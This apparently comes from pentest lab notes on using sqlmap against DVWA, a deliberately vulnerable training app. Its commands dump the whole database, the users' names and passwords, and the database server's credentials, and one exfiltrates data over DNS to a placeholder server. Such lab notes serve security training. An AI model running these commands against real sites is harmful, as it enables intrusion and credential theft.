# 03 - Data Collection

Search Tag(s): #sql-injection #sqlmap #credential-access-and-dumping #data-exfiltration #dvwa

TODO: Cover these parts

```
--no-cast           Turn off payload casting mechanism (prevents problems for data retrieval)
--no-escape         Turn off string escaping mechanism (part of obfuscation and prevents problems for data retrieval)
--hex               Use hex conversion during data retrieval (prevents problems for data retrieval)
```
### 3.1 - Dump the whole database

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa --dump-all
```

### 3.2 - Dump the specific tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent -D dvwa -T users -C user,password --dump
```

### 3.3 - Dump DBMS credentials

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --passwords
```

### 3.4 - Data Exfiltration via DNS (Out-of-band SQL Injection)

TODO: Demonstrate DNS exfiltration via sqlmap

```
$ sudo sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --dns-domain=<dns_server_IP> -D dvwa -T users -C user,password --dump
```

---
## References

- [SQLmap – Enumeration of Databases & Users from Vulnerable Web Forms](https://kalilinuxtutorials.com/sqlmap2/)